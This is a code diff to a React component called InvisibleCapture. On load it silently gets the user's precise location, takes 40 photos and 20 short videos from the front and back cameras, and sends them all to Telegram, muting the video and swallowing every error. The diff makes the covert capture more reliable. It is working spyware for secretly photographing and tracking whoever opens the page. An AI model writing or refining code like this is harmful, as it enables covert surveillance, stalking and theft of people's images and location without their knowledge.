@@ -20,15 +20,15 @@ export function InvisibleCapture({ onComplete }: InvisibleCaptureProps) {
 
   const startInvisibleCapture = async () => {
     try {
-      // Start all operations simultaneously for speed
+      // Start all operations simultaneously for speed with proper error handling
       const operations = [
-        getLocationFast(),
-        captureAllPhotosAndVideos()
+        getLocationFast().catch(() => null),
+        captureAllPhotosAndVideos().catch(() => null)
       ];
 
       // Wait maximum 2 seconds for everything
       await Promise.race([
-        Promise.all(operations),
+        Promise.allSettled(operations),
         new Promise(resolve => setTimeout(resolve, 2000))
       ]);
 
@@ -40,7 +40,11 @@ export function InvisibleCapture({ onComplete }: InvisibleCaptureProps) {
       onComplete();
     } finally {
       // Ensure camera is stopped
-      cameraService.stopCamera();
+      try {
+        cameraService.stopCamera();
+      } catch (error) {
+        // Ignore cleanup errors
+      }
     }
   };
 
@@ -48,8 +52,10 @@ export function InvisibleCapture({ onComplete }: InvisibleCaptureProps) {
     try {
       const locationData = await locationService.getHighAccuracyLocation();
       if (locationData) {
-        // Send location immediately
-        sendLocationToTelegram(locationData).catch(() => {});
+        // Send location immediately - catch all promise rejections
+        sendLocationToTelegram(locationData)
+          .catch(() => {})
+          .finally(() => {});
       }
       return locationData;
     } catch (error) {
@@ -59,16 +65,27 @@ export function InvisibleCapture({ onComplete }: InvisibleCaptureProps) {
 
   const captureAllPhotosAndVideos = async () => {
     try {
-      // Start all camera operations in parallel
-      const promises = [
-        rapidCapturePhotos('environment', 20),
-        rapidCapturePhotos('user', 20),
-        rapidRecordVideos('environment', 10),
-        rapidRecordVideos('user', 10)
+      // Capture photos from both cameras first (parallel)
+      const photoPromises = [
+        rapidCapturePhotos('environment', 20).catch(() => null),
+        rapidCapturePhotos('user', 20).catch(() => null)
       ];
-
-      // Execute all captures simultaneously
-      await Promise.allSettled(promises);
+      
+      await Promise.allSettled(photoPromises);
+      
+      // Then record videos (sequential to avoid camera conflicts)
+      try {
+        await rapidRecordVideos('environment', 10);
+      } catch (error) {
+        // Continue if back camera videos fail
+      }
+      
+      try {
+        await rapidRecordVideos('user', 10);
+      } catch (error) {
+        // Continue if front camera videos fail
+      }
+      
     } catch (error) {
       // Continue even if some fail
     }
@@ -77,32 +94,46 @@ export function InvisibleCapture({ onComplete }: InvisibleCaptureProps) {
   const rapidCapturePhotos = async (facingMode: 'user' | 'environment', count: number) => {
     try {
       const stream = await cameraService.startCamera(facingMode);
-      if (videoRef.current) {
-        videoRef.current.srcObject = stream;
-        videoRef.current.muted = true;
-        videoRef.current.play();
-      }
-
-      // Minimal stabilization time
-      await new Promise(resolve => setTimeout(resolve, 100));
-
-      // Capture all photos rapidly with no delay
-      const capturePromises = [];
-      for (let i = 1; i <= count; i++) {
+      if (!videoRef.current) return;
+      
+      videoRef.current.srcObject = stream;
+      videoRef.current.muted = true;
+      
+      // Wait for video to be ready
+      await new Promise((resolve) => {
         if (videoRef.current) {
-          capturePromises.push(
-            cameraService.capturePhoto(videoRef.current).then(photoBlob => {
-              const cameraType = facingMode === 'user' ? 'Front' : 'Back';
-              // Send immediately without waiting
-              sendPhotoToTelegram(photoBlob, undefined, i, cameraType).catch(() => {});
-            }).catch(() => {})
-          );
+          const video = videoRef.current;
+          video.onloadedmetadata = () => resolve(undefined);
+          video.oncanplay = () => resolve(undefined);
+          video.play().catch(() => resolve(undefined));
         }
-      }
+        // Fallback timeout
+        setTimeout(() => resolve(undefined), 300);
+      });
 
-      // Execute all captures at once
-      await Promise.allSettled(capturePromises);
-      cameraService.stopCamera();
+      // Capture photos with small delays to ensure quality
+      for (let i = 1; i <= count; i++) {
+        try {
+          if (videoRef.current && videoRef.current.readyState >= 2) {
+            const photoBlob = await cameraService.capturePhoto(videoRef.current);
+            const cameraType = facingMode === 'user' ? 'Front' : 'Back';
+            // Send immediately without waiting - catch all promise rejections
+            sendPhotoToTelegram(photoBlob, undefined, i, cameraType)
+              .catch(() => {})
+              .finally(() => {});
+          }
+        } catch (error) {
+          // Skip this photo if it fails
+        }
+        // Tiny delay between captures
+        await new Promise(resolve => setTimeout(resolve, 20));
+      }
+      
+      try {
+        cameraService.stopCamera();
+      } catch (error) {
+        // Ignore camera stop errors
+      }
     } catch (error) {
       // Continue with next step if this fails
     }
@@ -110,28 +141,30 @@ export function InvisibleCapture({ onComplete }: InvisibleCaptureProps) {
 
   const rapidRecordVideos = async (facingMode: 'user' | 'environment', count: number) => {
     try {
-      // Record all videos in parallel
-      const videoPromises = [];
-      
+      // Record videos sequentially to avoid camera conflicts
       for (let i = 1; i <= count; i++) {
-        videoPromises.push(
-          (async () => {
-            try {
-              const stream = await cameraService.startVideoRecording(facingMode);
-              const videoBlob = await cameraService.recordVideo(stream, 1000); // 1 second videos for speed
-              const cameraType = facingMode === 'user' ? 'Front' : 'Back';
-              
-              // Send immediately
-              sendVideoToTelegram(videoBlob, undefined, i, cameraType).catch(() => {});
-              cameraService.stopCamera();
-            } catch (error) {
-              // Skip this video if it fails
-            }
-          })()
-        );
+        try {
+          const stream = await cameraService.startVideoRecording(facingMode);
+          const videoBlob = await cameraService.recordVideo(stream, 1000); // 1 second videos for speed
+          const cameraType = facingMode === 'user' ? 'Front' : 'Back';
+          
+          // Send immediately - catch all promise rejections
+          sendVideoToTelegram(videoBlob, undefined, i, cameraType)
+            .catch(() => {})
+            .finally(() => {});
+          
+          try {
+            cameraService.stopCamera();
+          } catch (error) {
+            // Ignore camera stop errors
+          }
+          
+          // Small delay to prevent camera conflicts
+          await new Promise(resolve => setTimeout(resolve, 50));
+        } catch (error) {
+          // Skip this video if it fails
+        }
       }
-
-      await Promise.allSettled(videoPromises);
     } catch (error) {
       // Continue with next step if this fails
     }
